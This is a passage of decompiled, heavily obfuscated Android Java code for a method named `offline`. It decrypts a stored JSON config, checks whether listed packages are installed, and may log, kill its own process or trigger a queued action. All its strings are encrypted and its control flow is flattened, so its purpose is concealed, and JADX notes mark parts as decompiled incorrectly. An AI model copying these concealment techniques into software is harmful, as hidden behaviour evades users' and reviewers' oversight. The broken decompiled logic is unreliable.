        r1 = "۟ۡ۟ۜۧۖۦۙۜۧۢۥۘ۬۬ۚۨۨۜۘ۟ۘۤۚ۟ۚۚۥۘ۠۠ۛۡۤۖۤۘۧۘ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:196:0x033e, code lost:
    
        switch((r1.hashCode() ^ (-1949575179))) {
            case -566161881: goto L724;
            case 509353980: goto L799;
            case 788491035: goto L800;
            case 1448713670: goto L798;
            default: goto L804;
        };
     */
    /* JADX WARN: Code restructure failed: missing block: B:199:0x0347, code lost:
    
        r1 = "۠ۖۚۤۘۘۘۘۘۛۢۗ۫۟ۘۜۢۖۙۦۙۢۦۘۡۥۥۘ۫ۚۤ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:200:0x034a, code lost:
    
        r1 = "ۙ۟ۜۙۥۦۘۤۨۘۨۨۥۘۥ۠۟ۥ۠ۙ۟ۥۧۧ۟ۡ۟ۘۥۘۙۚۚۡۗۖ۟ۢ۟ۥۖۘۛۘۧۘ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:202:0x0354, code lost:
    
        switch((r1.hashCode() ^ (-595517921))) {
            case -2026788119: goto L809;
            case -1245403594: goto L801;
            case 866998718: goto L808;
            case 1661002530: goto L802;
            default: goto L813;
        };
     */
    /* JADX WARN: Code restructure failed: missing block: B:204:0x0358, code lost:
    
        r1 = "ۘۖۙ۟ۘۙۚۨۜۦۙۗۥۙۗۨ۠ۦۢۢۤۥۜۢۦۜ۫ۤۘۥ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:205:0x035b, code lost:
    
        r1 = "ۤۘۤ۟ۧۚ۠ۧۚۛۥۖۘۗۡۖۘ۬ۚۨۜۛۥ۫۫ۥۘۨۥۥۚۨۤۦ۟ۗۜۜ۟۬۬۬ۧۛۜۡ۫";
     */
    /* JADX WARN: Code restructure failed: missing block: B:206:0x035e, code lost:
    
        if (r0 != false) goto L811;
     */
    /* JADX WARN: Code restructure failed: missing block: B:207:0x0360, code lost:
    
        r1 = "ۨۚۥ۟ۙۚۥۜۤۜ۠ۡ۟۫ۘ۠۠۟ۖۡ۬۠ۨۢۛۜۖۘۨ۟ۙ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:208:0x0363, code lost:
    
        r1 = "ۙ۬ۨۥ۬ۛۤۘۘۜۥۚ۠۫ۦۘۢۗۥۘ۬ۛ۟ۦۡۡۙ۠ۜۘ۟۠۠ۡۨۜۡۨۤ۟ۖۤۢۡۘ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:209:0x0366, code lost:
    
        r1 = "۬ۧ۠ۚۜۜۨۜۢ۠ۛۘۤۡۨۘۢ۬ۧۨۚۖۘۘ۫ۧۗۨۚۛۙۧۨۙ۟ۙۜۧۘ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:723:0x0342, code lost:
    
        continue;
     */
    /* JADX WARN: Code restructure failed: missing block: B:724:0x0342, code lost:
    
        continue;
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void offline(Context context) throws PackageManager.NameNotFoundException, IOException {
        boolean z;
        try {
            String strShellSP_read = Utils.shellSP_read(context, l2.decrypt("oKTLnrh/\n", "w8ul+NEY8Fo=\n"));
            String str = "ۢۡۘۛۦۖۘۛۤۦۘۖۖۚ۠۬ۥۖۢۦۦۗ۠ۤۦۧۘۢۡۜۘۙۜۗۘ۬ۥۘۨۨۧ۟ۙۜ۟ۢۜۦۘۡۡۚۗ";
            while (true) {
                switch (str.hashCode() ^ 2030518497) {
                    case 359797349:
                        String str2 = "ۖۚۘۚۜۨۘۢ۟ۜۜۥۗۦۢۨۥ۫ۨۤۦۧۘۨۧۙۢۚۤۗۥۚۙۨۚۙۘۨۘ۬ۥۥۧۘۧۧۨۖۛۗۜ۠ۜۖ۠ۧ";
                        while (true) {
                            switch (str2.hashCode() ^ (-257717158)) {
                                case -142754749:
                                    break;
                                case 171031988:
                                    String str3 = "ۦۦ۠۫ۥۧ۟ۧۥۘۡ۟ۢۡۛۖۖۧۨۘۗۚۧۚۤ۬ۚۦۢ۫ۛۤۥۡۥۘ۟۫ۛ";
                                    while (true) {
                                        switch (str3.hashCode() ^ 1134032723) {
                                            case -600725515:
                                                str2 = "ۦۥۜ۠ۘۗۗۥۛۦۥ۫ۖ۟ۖۘۤۖۘۦ۠ۧۗۗۗۦۗۜۗۜۙۧۢۡۙ۟ۘۘ۬۠ۦۗۖۥۘۖۥۘۘۜۧۤۥۚۥۖۖۜ";
                                                continue;
                                            case -419967923:
                                                str2 = "ۜۘۜۘۘۦۜۘۚ۫ۙۛۖۦۢۛۙ۬ۜ۫ۢۜۡۙ۠ۗۘۖ۟ۗۘۜۘ۬۟ۚ۫ۖۖۖۜۘ";
                                                continue;
                                            case 754367842:
                                                str3 = "ۗۙ۫ۖۘۘ۬ۦۨۘۙۡۡۚۥ۫ۗۨۡۤۘ۫ۢۗۤۘۗ۫ۜ۠۬";
                                                break;
                                            case 1916555312:
                                                if (!strShellSP_read.trim().isEmpty()) {
                                                    str3 = "ۚۘ۬ۤ۬ۛۖۖۘۦۚ۬۬ۥۗۡۨۜ۟ۚۘۘۧۖۖۜۖۨۚۚۛۤۢۥۢۙۨۜۥۡۘۥۨۧۘۡۛۜۘۧۥ۠";
                                                    break;
                                                } else {
                                                    str3 = "۬ۡۨۥ۠ۦۙ۬۫ۛ۫ۚ۟ۗۢۚۜ۫ۢۙۧۢۜۦۖۨۘ۠ۛۖۘۤۜۦۘۧ۟ۨۘۡۜۧۢ۫۠۬ۗۦۘۧۜۧۘ";
                                                    break;
                                                }
                                        }
                                    }
                                    break;
                                case 382797259:
                                    str2 = "ۖۢۨۧۦۦۤۛۤۗ۠ۖۘ۬ۦۜ۠ۚۛۨۘۜۘۘۙۧۥۘ۠ۜۨۘۦۥۧۘۘ۬۟ۡۨ۠ۡۤۧ";
                                case 1139158243:
                                    String str4 = "ۨۛۜۥۗۗۡۧ۟۠۫ۘۘ۠ۥۧۘۦۥۖۡۦۢۗۛۜۡۘۚ۠ۤۦۦۙۙۨۢ۟";
                                    while (true) {
                                        switch (str4.hashCode() ^ 781880016) {
                                            case -559830482:
                                                break;
                                            case -31102494:
                                                String str5 = "ۗۚۖۛ۠ۥۥۨۥۤۜ۫ۥۘۚۜۘۡۢۚۥۦۚ۟۫ۥۘ۬ۢ۠ۘ۫ۥۘۢۢۡ";
                                                while (true) {
                                                    switch (str5.hashCode() ^ (-1112942472)) {
                                                        case -636241788:
                                                            str4 = "۠۫۫ۖۥۖۘۤ۠ۙ۠ۖۘۛۖۖۡۛۨ۟ۙۛۦۛ۠ۦ۠ۘۘۛ۫ۤ";
                                                            continue;
                                                        case 494813602:
                                                            str5 = "۫ۖ۠ۜۡ۫ۨۡۨۚۚ۫ۦۦۙۘۙۨۖۡۦۚۗۥۖۨۢ۬ۧۘۢ۠۬ۨ۫";
                                                            break;
                                                        case 1228985804:
                                                            str4 = "ۛۥ۫ۚۛ۫ۗۜۨۘۧۚۨۥۖۘۗۦۡۗۖ۬ۧۥۧ۬ۧۙۙ۫۟ۧۛ۟ۚۚ";
                                                            continue;
                                                        case 1552707181:
                                                            if (!l2.decrypt("o4dGxw==\n", "zfIqq5tXE4o=\n").equals(strShellSP_read)) {
                                                                str5 = "ۦۘۤۡۢۖۛۗ۟ۜ۟ۘۚۧۤۚۖۘۢۦۗ۠ۢۨۘۥۢ۠ۦۘۨۘ";
                                                                break;
                                                            } else {
                                                                str5 = "ۛۡ۠۬ۡۨۘ۫۬ۗۖ۟ۤۦۗۖۡۧ۟ۖۙۤۨۗۖ۫ۖ۫ۥۧۘ";
                                                                break;
                                                            }
                                                    }
                                                }
                                                break;
                                            case 369227639:
                                                str4 = "ۢۖۦ۠ۜۖۦ۬ۡۧۘۥۖۘۥۧۖۛۡۤۜۢۜۡۘۙ۠ۛۛۛ";
                                            case 1038151108:
                                                k2.logToFloatingWindow(l2.decrypt("WwkJi9GxsdPmcjz/iI/MI5jCUaWL+70m51Im/ZmEwAuNCQi20ZaJZr1TUKSN+4MZ\n", "AO61GDQcKY4=\n"), l2.decrypt("BJ8=\n", "a/R3coDBpE8=\n"));
                                                PackageManager packageManager = context.getPackageManager();
                                                String strShellSP_read2 = Utils.shellSP_read(context, l2.decrypt("e+XVNqNh\n", "GIq7UMoGqOk=\n"));
                                                k2.logToFloatingWindow(l2.decrypt("wAKcs1pJ7dh/WJ/HK0ySOQgAjbhWYfhiJkvFqh8MyDg=\n", "m+UgIL/kdYU=\n"), l2.decrypt("yDY=\n", "p13pCwyDJfY=\n"));
                                                JSONObject jSONObject = new JSONObject(decrypt(strShellSP_read2, l2.decrypt("vxg6nnk0mqi3GmjIL2bI9g==\n", "jioJqkwCrZA=\n")));
                                                boolean zOptBoolean = jSONObject.optBoolean(l2.decrypt("3JbZDKXDEmTdkdkIqw==\n", "vvq4b86cYgU=\n"), false);
                                                JSONArray jSONArrayOptJSONArray = jSONObject.optJSONArray(l2.decrypt("UR7wSeBZfatUJPd34V59r1ok63/xQQ==\n", "P3uHFoI1HMg=\n"));
                                                String str6 = "ۚۚۥۘۨۗۘۘۖۛ۬ۜۜۧۢ۟ۦۙۤۘۘۗۦۘ۫ۗ۟ۨۛۥۘۨۥ۬ۧ۟ۢۥۦۘۜۛۙۜۨۧۘۡۛۙۖۙۚ۬ۥۗۧۡۗ";
                                                while (true) {
                                                    switch (str6.hashCode() ^ (-1384382004)) {
                                                        case -1251021306:
                                                            str6 = "ۤۚۖۡۖۧۘ۫۬ۘۢۜۙۛۜۨۘۗ۟ۡۨۥ۠ۜۗۧۜۡۘۜۜ۠ۙۖۦ۠ۢۚ۟ۡۥ۠ۖ";
                                                            continue;
                                                        case -1015904444:
                                                            break;
                                                        case -567915976:
                                                            String str7 = "۟ۘۚ۠ۧۖۘۤۘۤ۠ۜۗۗۚۘۚۦ۠۟ۚۡۘۗۘۛۜۤ۬ۖۢۨ۫۬ۚۙۗ۬۫۠ۜۤۧۥ۠ۥۧۘۥ۫ۜۘۙۗۥۘۛۦ";
                                                            while (true) {
                                                                switch (str7.hashCode() ^ (-801774618)) {
                                                                    case -1156203800:
                                                                        str7 = "۠ۖۡۘۤۚ۟ۛۛۙۚۦ۫ۜۖۘۥۛۥۘ۬ۛۙۨۘۛۤۜۘ۫۠ۚ";
                                                                        break;
                                                                    case -560683635:
                                                                        str6 = "ۡۤۚۚ۫ۗۨۙۖ۬ۚۖۘۘ۬ۥۘۢۙۖۗۚۖۙۧ۫ۥۚۖۚ۫ۛۘۤۥۤۤۡۘۜۘۘۖۨۡۚۤۘۚۜۜ";
                                                                        continue;
                                                                        continue;
                                                                    case -152697660:
                                                                        str6 = "ۥۢۨۘ۠ۡۜۘۤۦۤۙ۫ۥۘۨۦۘۘۙ۟ۘۘۖۥۖۦ۠ۧۜۦ۠ۜۨۘۗۘۙۢ۟ۙۖ۠۠ۜۖۗ";
                                                                        continue;
                                                                    case 1167328822:
                                                                        if (!zOptBoolean) {
                                                                            str7 = "ۚۘۚۖ۫۟ۡۚۤۥۦۖۢۛ۬ۧۡۘۘۙۘۦۛۨۦۙۧۙۧۧۛۦۘۦۚۢۚۙۖۦ۠ۖۨۛۚۗۙۤۧ";
                                                                            break;
                                                                        } else {
                                                                            str7 = "۫ۗۧۦۛ۫ۦ۟ۖ۬ۗۦ۬ۦۢۖۧۚ۬۫ۨۘۖۗۗۘۤ۟ۨۦۦۖۛۙۛۙۧۙۥۜۘ۠ۡۘۛۛۨۙۗۜ";
                                                                            break;
                                                                        }
                                                                }
                                                            }
                                                            break;
                                                        case 447375606:
                                                            String str8 = "ۡ۬ۦۘۤۧۥۘ۫ۜۨۚۦۧۘۗۤۤۡۗۦۦۙۨۘۨۙۜۘۢ۟ۥۡۤۜۘۛۛ۠ۦۥۘۖۜۛۨۖ۠ۨۜۘۦۥ۫";
                                                            while (true) {
                                                                switch (str8.hashCode() ^ (-257926069)) {
                                                                    case -1557358495:
                                                                        String str9 = "ۚۨۖۘ۫ۚۖ۫ۜۥۨ۠ۘۜۡۡۘۛ۠۟ۘۢۨ۟ۦۘۛۨۜۢ۫۬۬۟ۜۘۧۨ۟ۗۨ۫۫۬۟۬۠ۤۦ۫۠ۧۙۙۨۤۨۘ";
                                                                        while (true) {
                                                                            switch (str9.hashCode() ^ 78628914) {
                                                                                case -1989267803:
                                                                                    int i = 0;
                                                                                    while (true) {
                                                                                        int i2 = i;
                                                                                        String str10 = "ۧۥۧۖۛۚۖۙۚ۫ۖۧۢۤۧۛۙۢۘۥۡۖۨۤۤۙۖۧۤۜۘ۬۬ۘۧ۟۠۬ۛۛۨۦۧۘۛۥۥۘۢۥۡۘ";
                                                                                        while (true) {
                                                                                            switch (str10.hashCode() ^ (-188852852)) {
                                                                                                case -1461384770:
                                                                                                    JSONObject jSONObjectOptJSONObject = jSONArrayOptJSONArray.optJSONObject(i2);
                                                                                                    String str11 = "ۗۚۘۘۥۙ۫۫ۙۧ۠ۦۜۘ۟ۢۡ۟۠ۥۧۡۨۦ۬ۥۘۢۥۤۗۥۡۖۢ۬ۘۥۥۘۧۥۡۙۘۧۘۨ۫ۘۘۢۨۨۘۜۙۜۘۖۛۦ";
                                                                                                    while (true) {
                                                                                                        switch (str11.hashCode() ^ (-2127475794)) {
                                                                                                            case -1705213944:
                                                                                                                str11 = "ۢۗۘۘۖ۬ۘۧۥۘۨۥۤۦۗۨۙۤۧۢۗ۬ۚۜۥۘۤۨۧۘۧۤۚۦ۠ۥۘۜۥۜۢۥۖۘۥۜۘۛۤۨۘۖۦ۫ۗۜۦۘۗۜۧ";
                                                                                                                break;
                                                                                                            case -790700044:
                                                                                                                break;
                                                                                                            case 1224067333:
                                                                                                                String strOptString = jSONObjectOptJSONObject.optString(l2.decrypt("qeAUlOJ3Jzy34Bqa\n", "2YF3/4MQQmM=\n"));
                                                                                                                int iOptInt = jSONObjectOptJSONObject.optInt(l2.decrypt("IcHqSoqiYH481Ps=\n", "RaSeL+nWPwo=\n"), 0);
                                                                                                                int iOptInt2 = jSONObjectOptJSONObject.optInt(l2.decrypt("SYdKgrstw4JRlFs=\n", "KOQ+69RDnPY=\n"), 0);
                                                                                                                String strOptString2 = jSONObjectOptJSONObject.optString(l2.decrypt("opk1wlDafeY=\n", "1vBFnSS/BZI=\n"), "");
                                                                                                                try {
                                                                                                                    packageManager.getPackageInfo(strOptString, 0);
                                                                                                                    z = true;
                                                                                                                } catch (PackageManager.NameNotFoundException e2) {
                                                                                                                    z = false;
                                                                                                                }
                                                                                                                String str12 = "۟ۦۨۘۖۗۦۘۚۜۚ۬ۨۦۘ۠ۧۘ۠ۙۛۧۖۜۙۗۧۚ۟ۢ۠ۚۨۚۦ۠ۖۖۘۖ۟ۙۢۘۖ";
                                                                                                                while (true) {
                                                                                                                    switch (str12.hashCode() ^ 892930144) {
                                                                                                                        case -2119569475:
                                                                                                                            str12 = "۬ۤۛۛ۬ۖۤ۬ۦۘۥۥۨۘۥ۟ۜۘۥۛۧ۫ۦۡ۟ۘ۟ۡۘۚ۬ۧۙۘۥۘۡۢۖۘۖۢۗۛۗۙۛۜۦۘۙۖۡۙۚۜۙۢۜ";
                                                                                                                        case -745294770:
                                                                                                                            String str13 = "۟ۜۢ۬ۥۢۖ۫ۨۘۘۚۗ۬۠ۥۘۛ۬۬۠ۗ۬ۗ۟۠ۡۚۜۘۖۖ۫ۢۖ۬ۨۜۧۘۘ۬ۜۘۖۨۧۘ۠۟ۦۘ۟ۗۡۘ";
                                                                                                                            while (true) {
                                                                                                                                switch (str13.hashCode() ^ (-1785211862)) {
                                                                                                                                    case -1695848520:
                                                                                                                                        str12 = "ۢۨۨ۫ۨۥۧۦۦۘۤۤۧ۬۟ۖ۬ۨۥۘۛ۠ۛۥ۬ۛۗۚۤۗۥۘۙۨ۟ۖۜۛۖۦ۬ۗ۫۟";
                                                                                                                                        break;
                                                                                                                                    case -1194921265:
                                                                                                                                        str13 = iOptInt == 0 ? "ۢۡۨۧۜۤۗۢۡۛ۠۬ۢۜۘۥ۬۠ۛۗۦۤۢۜۘۜ۬ۨۘۦۜۗ۠ۜۖۘۡ۬ۡ" : "ۙۚۥۨۙۜۘۥۚۘۡۦۙۛۗۧۗۥ۠ۨ۬ۗۨ۠ۘۘۛۢۖۘۛۖۖۨۥۧۚۦۧۘۥ۟۬۫ۤۨۦۢۨۘۗ۬ۗۨۜۥۤۘۘ";
                                                                                                                                    case -1177924701:
                                                                                                                                        str13 = "ۧۜۡۢۧۘۨۛۚۨ۫۫ۥۧۡ۟ۥۘۛ۠ۜۥۜۘۘۚۖۤۛۘ";
                                                                                                                                    case 1877572063:
                                                                                                                                        str12 = "ۧۜۧۦ۠ۖۘ۟ۢۛۗۤ۫ۡ۟ۤۦۢۙۜۥۤۡۨۖۘۢۧ۫ۛۨۧۙۛۡۛ۠ۗۢۤۢ۬ۗۢۖۘ۫ۘۧۘ";
                                                                                                                                        break;
                                                                                                                                }
                                                                                                                            }
                                                                                                                            break;
                                                                                                                        case 10987767:
                                                                                                                            break;
                                                                                                                        case 2052107827:
                                                                                                                            String str14 = "۬ۨۖۘۜۛۘۖۗۜ۬ۖۗ۬ۨۖۘ۠ۤۥۘ۬ۧۡۤۛۜۘۘۜۨۘ۠ۛۥۧۢۡۘۘۛۘۘۤ۬۟۟ۦ۫ۗۢۡۘۛۚۛ";
                                                                                                                            while (true) {
                                                                                                                                switch (str14.hashCode() ^ 924820814) {
                                                                                                                                    case -2008940618:
                                                                                                                                        break;
                                                                                                                                    case 1624149559:
                                                                                                                                        String str15 = "ۜۜۜۨۧۘۗۧۤ۟ۘۘ۠ۨۜۘۨۧ۟ۙ۟ۧۛ۬ۧۗ۫ۨۘۙۡۥۜۘ۫۫ۛۚ";
                                                                                                                                        while (true) {
                                                                                                                                            switch (str15.hashCode() ^ (-744567584)) {
                                                                                                                                                case -1405256486:
                                                                                                                                                    str14 = "ۛۖۧۘۦ۫۬ۨۘۨۦ۠ۚۢۚۙۧۚۤۜۡۡ۠ۥ۫ۙۜۙۧۥۘۗۖۛۚۧ۠ۨۛۦۖۧۤ";
                                                                                                                                                    break;
                                                                                                                                                case 772191723:
                                                                                                                                                    str15 = !z ? "ۜۦۥۘ۠ۜۙ۟ۦۧۘۤۡۨۦۢۡۦۡۧۧۤۜۘ۟ۥ۠ۨ۬ۜۘۨ۟ۜۘۚ۫ۜۙۚۨۘۙۖۘۡۗۚ" : "ۡۙۚ۬ۜۤۥۜۘۘۤۜ۠ۧۤۙۖۘۥۙۧۘۘ۟ۖۜۗۛۥۤۙۥ۬ۨۡۧ۬۬ۗۨۘۧۡۧۘۘ۬ۦ۟ۚۗ";
                                                                                                                                                case 1099009899:
                                                                                                                                                    str15 = "ۢۚۧۦۜۖۚۘ۫۠ۨۧۘۧۚۖۡ۠۫ۚۖۜۡۢۡ۫۟ۨۘ۟ۘۚۜۡۛۡۙۜۨۥۦۖۘۘ";
                                                                                                                                                case 1960645114:
                                                                                                                                                    str14 = "۠ۘۢ۟۟۬ۡۜۚۜۖ۠ۖۛۤۥۙۙۤۙ۫۫۠ۖۨۜۘۥۛۡۘۦۜۥۘۡۖۤ";
                                                                                                                                                    break;
                                                                                                                                            }
                                                                                                                                        }
                                                                                                                                        break;
                                                                                                                                    case 1791271181:
                                                                                                                                        break;
                                                                                                                                    case 2055074817:
                                                                                                                                        str14 = "ۨۨۨۘ۠ۛۥۤ۟ۨۗ۠ۧۡۛۗۨۦۖۘۚ۬ۡۡ۫ۜ۟ۖ۟ۦۨۘ";
                                                                                                                                }
                                                                                                                            }
                                                                                                                            break;
                                                                                                                    }
                                                                                                                }
                                                                                                                String str16 = "ۚ۠ۦۘۘۘۘۘ۬ۚۗۙۦ۟۟ۡۘۘۢۨۘۘۤۗ۫۬ۗۛۥۨ۬ۚۨۗۤۤۡۘۙۛۗۙۥۡۤۜ۫";
                                                                                                                while (true) {
                                                                                                                    switch (str16.hashCode() ^ (-1622914761)) {
                                                                                                                        case -25898324:
                                                                                                                            String str17 = "ۨۧۖۘ۟ۚ۫ۢۢۘۧۙۧۘۜۘۨۛۡۨۗۜۘۨۦ۠ۧۧۖۘۙۡۨۖ۫ۡ۬۟ۚۦۚۙۖۨۛ";
                                                                                                                            while (true) {
                                                                                                                                switch (str17.hashCode() ^ (-1336883537)) {
                                                                                                                                    case -1754446225:
                                                                                                                                        str17 = "ۖۜۡۘۗۚۦۨۙۘۦۜۘۥۥۜۘۨۘۙۖۙۗ۠۟ۜۜ۬ۘۛۚۡۘۗۨۨۢۙۧۜۘۡۥۤ۠ۛۖۧۘ۬۬ۘۚ۟ۖۜۥ";
                                                                                                                                    case -660194871:
                                                                                                                                        str16 = "ۡۙۗ۫ۙۤۙۜۥۙۦۜۘۜۦ۟ۥۡۘ۫ۗۢۚ۫۠ۖۡۘۙۨۤۛۦۙۚۧۖ";
                                                                                                                                        break;
                                                                                                                                    case -574483357:
                                                                                                                                        str16 = "ۧۥۗۨۗۦۘۜ۠ۨۘۥۗ۬ۥۢۡۜۗۙۖۜۥۘۨۖۤۛۦۘ۫ۢۖۘ۫ۛۚۨۖۘ";
                                                                                                                                        break;
                                                                                                                                    case -497406429:
                                                                                                                                        str17 = iOptInt2 != 0 ? "ۡۘۢۗۡۢ۫ۨۤۧۛۘۘۗۥۢۢ۬۫۬ۛۦۘ۟۠۟ۜۡۜۘۥۙ۬ۧۖۨۘۥۛۘۘۙۗۖۚۚۦۘ" : "ۥۡۧۚ۠۫۠ۨۥۤۖۨۘۖۤۧۨۜۖۧۦۘۘۘۜۧۦۡ۠ۖ۠ۦ۫ۖۗۥۘۘ";
                                                                                                                                }
                                                                                                                            }
                                                                                                                            break;
                                                                                                                        case 912853376:
                                                                                                                            k2.logToFloatingWindow(l2.decrypt("uTS1AmwyxUMASal+MRB9+25W7AEEesyjBmukfjUF\n", "4tMJkYmfXR4=\n") + strOptString + l2.decrypt("t4gyu9wsaaj60TT8jxky4PuH\n", "WDS+XGekjwU=\n"), l2.decrypt("bLAggAc=\n", "CcJS73X5cic=\n"));
                                                                                                                            return;
                                                                                                                        case 1623877560:
                                                                                                                            str16 = "ۥۘۖۘۛۥۘۢۢۖۘۢ۠ۥۤۘۦۗۡۥۘ۠ۗۘۜ۫ۧۜۜۛۗۛ۬ۘۨ۠۠ۜۨۘ";
                                                                                                                            break;
                                                                                                                        case 2100800546:
                                                                                                                            String str18 = "ۤۡۨۤۜۦۘۖ۬ۖۢ۫ۜۘۙ۫۬ۗ۫ۨۜۧۖۢۡۚ۫ۨۘۢۦۘۘۦۙۚۖۥۥۘ۠۫ۗۘۧۨ";
                                                                                                                            while (true) {
                                                                                                                                switch (str18.hashCode() ^ (-63074278)) {
                                                                                                                                    case 153134859:
                                                                                                                                        String str19 = "ۙ۟ۢۢۥۜۘ۟۟ۤ۟ۦۤۙۘۖۘۚۙۦۗۗۡۖۡۘۨۡ۠ۜۢۜ";
                                                                                                                                        while (true) {
                                                                                                                                            switch (str19.hashCode() ^ 237015815) {
                                                                                                                                                case -2095867435:
                                                                                                                                                    str18 = "۫ۛۧۡ۬ۢ۫ۡۥۖۖۨ۟ۦۘۘۨۜۘۘۛ۫ۨۘۖۗۡۘۘۤۜۖۡۨۘۧ۬ۥۙۨۦۜۢۥۘۜ۫ۜ۟ۖ۫ۛۤۥۘۥۖۛ۬ۨ";
                                                                                                                                                    break;
                                                                                                                                                case -121444310:
                                                                                                                                                    str19 = iOptInt2 != 1 ? "ۚۢۢۢۥۢ۫ۧۦۘۤۛۙۡۢۥۘۗۚۥۛۜۖۤۤ۬۠ۧۜۘۙۖۘۤ۫ۡۦ۫ۢۥ۠ۘ۠۟ۤ۠ۖۘۘ۫ۤ۠" : "ۖۡ۟ۘ۫ۜۘۥۤۦۨ۟ۥۘۚ۠ۜۘۜۥۚۧۤۙۢۥۚ۟ۙ۠ۡ۟ۖۘ۟ۡ۫ۦ۫ۘۜۙۥۧۡۘۦ۬ۘۘ۫ۙۤۦۙۧۥ۟ۚ";
                                                                                                                                                case -14499061:
                                                                                                                                                    str18 = "۟ۙۘۘۙۢۧۚۥۖ۟ۖۥۘۨۦۖۘۤۗۛۢۘۘۘ۠ۗۜۘۙۛۙۚۡۘۘۚۥۢ۟۫ۨۜۛۧۢ۫ۦ۠ۡۚۘۤۥۦۚۗۥۧۘۘ";
                                                                                                                                                    break;
                                                                                                                                                case -4530653:
                                                                                                                                                    str19 = "ۡۧۗۤۘۙۨۖۥۢۧۨۡۨ۫ۨۘ۫ۨۘ۫ۡۛۤۖ۬۟۟ۡۤۡۡۖۧۜۘ";
                                                                                                                                            }
                                                                                                                                        }
                                                                                                                                        break;
                                                                                                                                    case 1085439630:
                                                                                                                                        k2.logToFloatingWindow(l2.decrypt("Wri/mD6NaAHjxaPkY6/QuY3a5ptWxWHh5eeu5Ge6\n", "AV8DC9sg8Fw=\n") + strOptString + l2.decrypt("wwBM+5hSzpWOVH+My3uk\n", "LLzAHCPaKDg=\n"), l2.decrypt("/tDihU8=\n", "m6KQ6j0jESM=\n"));
                                                                                                                                        Process.killProcess(Process.myPid());
                                                                                                                                        return;
                                                                                                                                    case 1661541175:
                                                                                                                                        str18 = "۬ۛۤ۬ۚۙ۟ۛۘۘۦۢ۟ۙۙۦۡۛۗۦۤۨۧۙۖۖۨۢۘۥۡۘۛۜ۠ۗۨۗۦۖۨۘۡۚۙ";
                                                                                                                                        break;
                                                                                                                                    case 2008770909:
                                                                                                                                        String str20 = "ۦۤۤۘ۟ۢۗۛۘ۠ۨۡۢۥ۫ۢۖ۬ۜۖۡۖۘۚۢۙۡۛۡۖۘۡۢۘۛۘ۠ۥ۠ۡۘۨۛۨۘۗۢۚۤ۟ۥۗۖۨۘۘۘۘۘ";
                                                                                                                                        while (true) {
                                                                                                                                            switch (str20.hashCode() ^ 857886681) {
                                                                                                                                                case -1874349593:
                                                                                                                                                    str20 = "۠ۢ۟ۨ۬۬ۦۖۧ۬ۧۜۖ۫ۥۘۘۥۡۗ۬ۘۘۢ۬ۡ۠ۤ۫ۥۡۘۗۥۜۥۤ۠";
                                                                                                                                                    break;
                                                                                                                                                case -1859177430:
                                                                                                                                                    String str21 = "۠ۗۡۘۛۙ۫ۘ۠ۗ۠ۥۘ۫ۘ۬۠ۥۦۘۦ۟ۛۖۚۨۨ۠ۡۘۥۥۗ";
                                                                                                                                                    while (true) {
                                                                                                                                                        switch (str21.hashCode() ^ 820268754) {
                                                                                                                                                            case -1028202208:
                                                                                                                                                                str21 = "ۦۛۜۡۡۖۜۙۥۘ۫۫ۦۘۖۨۘۙۤۨۖۘۘۥۚۡۘۨۛۖۘۖۘۘ";
                                                                                                                                                            case -755937323:
                                                                                                                                                                continue;
                                                                                                                                                                continue;
                                                                                                                                                                continue;
                                                                                                                                                            case 817065248:
                                                                                                                                                                k2.logToFloatingWindow(l2.decrypt("tk6yV2vdPuUPM64rNv+GXWEs61QDlTcFCRGjKzLq\n", "7akOxI5wprg=\n") + strOptString + l2.decrypt("/UskfM8rH72oEScJlDZA36tBTyLgdGel\n", "EveomXOS+jo=\n"), l2.decrypt("b2Ku10s=\n", "ChDcuDl5CRg=\n"));
                                                                                                                                                                new Handler(Looper.getMainLooper()).post(new q0(1, context, strOptString2));
                                                                                                                                                                new Handler(Looper.getMainLooper()).postDelayed(new a(3), 1500L);
                                                                                                                                                                return;
                                                                                                                                                            case 1440064609:
                                                                                                                                                                String str22 = "ۢۨۘۨۦ۬ۛۤۚۢۥۚ۫۬ۨۘ۬۫ۘۘۜ۫ۜۘۤۙۧۤۗۗۛۖۖۘ۟ۘۧۘۗۜۙۜۙۙۗۗۧ";
                                                                                                                                                                while (true) {
                                                                                                                                                                    switch (str22.hashCode() ^ 1193946913) {
                                                                                                                                                                        case -2132925737:
                                                                                                                                                                            str21 = "ۦ۟ۘ۬ۧۖۙۚۜ۟ۖۘۨۛۥ۟۠ۘۢۖۧۜۦۥۘۥۘۖۤ۬ۥۘۦۖۘۘۡ۬ۘۘۚ۫ۥۘۚۙۖۘۨۨۜۗۢۗۤۡۦۘۖۦۖ";
                                                                                                                                                                            break;
                                                                                                                                                                        case -1588605678:
                                                                                                                                                                            str21 = "ۙۤۖۗۖۗۧۡۚۦۧ۟۬ۖۡۘۤۛۘۙۗۥۦۨ۠۫ۜ۠۠ۨۡۘۙ۟ۡۘۦ۬۟ۚۚ۠ۛۖۜۘ۠ۖۗ۬ۨۦۘ";
                                                                                                                                                                            break;
                                                                                                                                                                        case -1293071800:
                                                                                                                                                                            str22 = iOptInt2 != 3 ? "ۗۛ۬ۛۜۥۘۜ۬ۤ۟ۨۗۚۚ۠ۚۧۥۘۥ۫۠۠ۥۖۜۧۧۤ۠ۖۘۛۙ۫ۜ۟ۗۗۘۧۘۚۡ۠۬ۗۥۘۛ۬ۜۘ" : "ۨ۟ۘۚۢۚۦۡۧۘۨۦۨ۠ۥۘۜۘ۬۬ۥۘۨۛۛۘۦ۬ۛۖۨۘ";
                                                                                                                                                                        case 1375427891:
                                                                                                                                                                            str22 = "ۛ۬ۛۙۗۚۚ۬ۜ۬ۧۦۥۤ۫ۧ۠ۗۧ۟۫ۨۘۛۜۨۘۖ۠ۡۘۘۖۗۚۨۜۘ";
                                                                                                                                                                    }
                                                                                                                                                                }
                                                                                                                                                                break;
                                                                                                                                                        }
                                                                                                                                                    }
                                                                                                                                                    break;
                                                                                                                                                case -43504805:
                                                                                                                                                    String str23 = "ۡ۫ۛۜۢۦ۫ۗۜۛۢۖۘۥۖۡۘۙۜۦۜ۠ۥ۫ۢۙۤۖۘۜۘۥۘۘۗ۬ۤ۬ۥۥۢۥۡۥ۬۟ۥۛۦۤۤۢۛۡۖ۠ۡۘ";
